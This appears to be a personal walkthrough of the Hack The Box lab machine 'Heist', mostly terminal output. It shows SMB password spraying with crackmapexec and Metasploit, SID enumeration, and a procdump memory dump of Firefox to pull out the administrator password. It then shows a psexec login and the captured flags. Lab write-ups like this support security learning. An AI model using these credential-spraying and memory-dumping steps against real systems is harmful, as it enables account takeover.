enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

┌──(root💀kali)-[~/Downloads/HTB/Heist]
└─# crackmapexec smb -u user.txt -p pass.txt --shares 10.10.10.149                                                                                                       2 ⨯
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\support: STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin: STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] Enumerated shares
SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark
SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------
SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$                          Remote Admin
SMB         10.10.10.149    445    SUPPORTDESK      C$                              Default share
SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC


Hazard : stealth1agent

┌──(root💀kali)-[~/Downloads/HTB/Heist]
└─# lookupsid.py 'Hazard:stealth1agent'@10.10.10.149
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
                                         
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.10.149:445      - 10.10.10.149:445 - Starting SMB login bruteforce
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\support:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\support:Q4)sJu\Y8qz*A3?d',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\support:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\support:',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:Q4)sJu\Y8qz*A3?d',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Hazard:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Hazard:Q4)sJu\Y8qz*A3?d',
[+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\Hazard:stealth1agent'
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:Q4)sJu\Y8qz*A3?d',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Administrator:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Administrator:Q4)sJu\Y8qz*A3?d',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Administrator:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Administrator:',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Guest:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Guest:Q4)sJu\Y8qz*A3?d',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Guest:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Guest:',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Chase:$uperP@ssword',
[+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\Chase:Q4)sJu\Y8qz*A3?d'
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Jason:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Jason:Q4)sJu\Y8qz*A3?d',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Jason:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\Jason:',

Chase : Q4)sJu\Y8qz*A3?d

user.txt : a127daef77ab6d9d92008653295f59c4

cd \
cd "Program Files"
dir and we see firefox is installed ans thats out of usual so ran get-process and we can see that firefox is running 5 processes 

    1053      70   153112     229036       5.94   6212   1 firefox
    347      19    10024      37668       0.08   6320   1 firefox
    401      33    31900      91496       0.84   6444   1 firefox
    378      28    22228      59128       0.63   6744   1 firefox
    355      25    16340      38948       0.06   6992   1 firefox

download and extract sysinternals.zip and use procdump64.exe to dump the firefox dump file
use procdump64.exe against the fireox process
procdump64.exe -accepteula
procdump64.exe -ma process id
download the dumpfile to attacker machine and run strings against it to get the administrator password 
strings firefox...dmp | grep passwords | less 

add administrator to the user.txt and the newly obtained password to pass.txt
run crackmapexec against it to see the shares 
crackmapexec -u user.txt -p pass.txt --shares 10.10.10.149

┌──(root💀kali)-[~/Downloads/HTB/Heist]
└─# crackmapexec smb -u user.txt -p pass.txt --shares 10.10.10.149
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
^C

[*] Shutting down, please wait...
SMB         10.10.10.149    445    SUPPORTDESK      [+] Enumerated shares
SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark
SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------
SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.10.149    445    SUPPORTDESK      C$              READ,WRITE      Default share
SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC
 
administrator : 4dD!5}x/re8]FBuZ

psexec.py Administrator@10.10.10.149
grab the root flag from c:\Users\Administrator\Desktop\root.txt

root.txt : 50dfa3c6bfd20e2e0d071b073d766897
